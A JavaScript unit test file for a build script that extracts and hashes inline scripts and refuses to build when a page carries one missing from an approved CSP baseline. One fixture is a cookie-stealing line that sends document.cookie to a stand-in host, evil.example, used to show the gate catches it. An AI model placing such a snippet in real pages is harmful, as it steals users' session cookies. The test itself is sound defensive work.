/**
 * @fileoverview Unit tests for build-security-headers logic
 * Run: node scripts/build-security-headers.test.js
 */

const fs = require("fs");
const path = require("path");
const { execFileSync } = require("child_process");
const headers = require("./build-security-headers.js");
const { extractInlineScripts, sha256Base64, findUnapprovedHashes, allPages } = headers;

const ROOT = path.join(__dirname, "..");

let passed = 0;
let failed = 0;

function eq(actual, expected, label) {
  const a = JSON.stringify(actual);
  const e = JSON.stringify(expected);
  if (a === e) {
    passed++;
  } else {
    failed++;
    console.error(`  ✗ ${label}\n      expected ${e}\n      got      ${a}`);
  }
}

console.log("Testing extractInlineScripts()...");

// Test cases
eq(
  extractInlineScripts('<script>console.log("hello");</script>'),
  ['console.log("hello");'],
  "Extracts basic inline script"
);

eq(
  extractInlineScripts('<script type="text/javascript">alert(1);</script>'),
  ["alert(1);"],
  "Extracts inline script with type attribute"
);

eq(
  extractInlineScripts('<script src="app.js"></script>'),
  [],
  "Ignores external scripts (with src)"
);

eq(
  extractInlineScripts(
    '<script type="application/ld+json">{"@context": "https://schema.org"}</script>'
  ),
  [],
  "Ignores JSON-LD scripts"
);

eq(
  extractInlineScripts(
    '<script type="application/ld+json" >{"@context": "https://schema.org"}</script>'
  ),
  [],
  "Ignores JSON-LD scripts with extra space"
);

eq(
  extractInlineScripts(
    '<script type="application/ld+json"\n>{"@context": "https://schema.org"}</script>'
  ),
  [],
  "Ignores JSON-LD scripts with newline before bracket"
);

eq(
  extractInlineScripts(
    '<script type=\'application/ld+json\'>{"@context": "https://schema.org"}</script>'
  ),
  [],
  "Ignores JSON-LD scripts with single quotes"
);

eq(
  extractInlineScripts("<script>let a = 1;</script>\n<p>HTML</p>\n<script>let b = 2;</script>"),
  ["let a = 1;", "let b = 2;"],
  "Extracts multiple inline scripts"
);

eq(
  extractInlineScripts('<script defer src="app.js"></script>'),
  [],
  "Ignores external scripts with other attributes"
);

eq(
  extractInlineScripts('<script type="module">import "app.js";</script>'),
  ['import "app.js";'],
  "Extracts inline module script"
);

eq(
  extractInlineScripts('<script id="test" class="foo">console.log("hello");</script>'),
  ['console.log("hello");'],
  "Extracts inline script with id and class attributes"
);

function assert(condition, label) {
  if (condition) {
    passed++;
  } else {
    failed++;
    console.error(`  \u2717 ${label}`);
  }
}

/* ---------- the baseline gate (audit C-4 / H-13) ----------
   The generator used to hash whatever inline scripts it found and emit them
   in the CSP, so anything that reached a page -- including CMS text
   interpolated into the Tawk.to snippet -- was allowlisted by the policy
   meant to contain it. These tests prove the gate that stops that. */
console.log("\nTesting the inline-script baseline gate...");

const baseline = headers.readBaseline();

assert(Object.keys(baseline).length > 0, "the committed baseline lists at least one hash");
assert(
  Object.keys(baseline).every((h) => /^sha256-[A-Za-z0-9+/]+=*$/.test(h)),
  "every baseline key is a sha256-<base64> hash"
);

// Every inline script actually on the site today is approved.
const pages = allPages();
assert(
  pages.some((page) => /^products\//.test(page)),
  "allPages() globs the generated product pages, not just one of them"
);
const livePageScripts = {};
pages.forEach((page) => {
  livePageScripts[page] = extractInlineScripts(fs.readFileSync(path.join(ROOT, page), "utf8"));
});
assert(
  findUnapprovedHashes(livePageScripts, baseline).length === 0,
  "every inline script currently on the site is in the baseline"
);

// A NEW inline script is not.
const injected = { "fake-page.html": ['fetch("https://evil.example/?c=" + document.cookie);'] };
const unapproved = findUnapprovedHashes(injected, baseline);
assert(unapproved.length === 1, "an unrecognised inline script is reported as unapproved");
assert(
  unapproved.length === 1 &&
    unapproved[0].hash === "sha256-" + sha256Base64(injected["fake-page.html"][0]),
  "the report names the offending script's own hash"
);
assert(
  findUnapprovedHashes(injected, Object.assign({}, baseline, { [unapproved[0].hash]: {} }))
    .length === 0,
  "the same script passes once its hash is added to the baseline"
);

/* End to end: put a page carrying a brand-new inline script into the tree and
   prove `node scripts/build-security-headers.js` refuses to run. The check
   happens before anything is written, so _headers/vercel.json/netlify.toml
   are untouched by the failed run -- asserted here too. */
const tempPage = path.join(ROOT, "products", "__csp-baseline-test.html");
const outputs = ["_headers", "vercel.json", "netlify.toml"].map((f) => ({
  file: f,
  before: fs.readFileSync(path.join(ROOT, f), "utf8")
}));
let exitCode = 0;
let output = "";
try {
  fs.writeFileSync(
    tempPage,
    "<!DOCTYPE html>\n<html><head><title>t</title></head><body>\n" +
      '<script>window.__cspBaselineProbe = "not in the baseline";</script>\n' +
      "</body></html>\n"
  );
  try {
    output = execFileSync("node", [path.join(__dirname, "build-security-headers.js")], {
      cwd: ROOT,
      encoding: "utf8",
      stdio: ["ignore", "pipe", "pipe"]
    });
  } catch (e) {
    exitCode = typeof e.status === "number" ? e.status : -1;
    output = String(e.stdout || "") + String(e.stderr || "");
  }
} finally {
  if (fs.existsSync(tempPage)) fs.unlinkSync(tempPage);
}

assert(exitCode === 1, "build-security-headers.js exits 1 when a page carries a new inline script");
assert(
  output.indexOf("not in the approved baseline") !== -1,
  "the failure explains that the script is not in the approved baseline"
);
assert(
  output.indexOf("__csp-baseline-test.html") !== -1,
  "the failure names the page the new script is on"
);
assert(
  output.indexOf("inline-script-hashes.json") !== -1,
  "the failure says where an approved hash would go"
);
outputs.forEach((o) => {
  assert(
    fs.readFileSync(path.join(ROOT, o.file), "utf8") === o.before,
    o.file + " is left untouched by the refused build"
  );
});

if (failed > 0) {
  console.error(`\n${failed} test(s) failed.`);
  process.exit(1);
} else {
  console.log(`\nAll ${passed} test(s) passed.`);
}
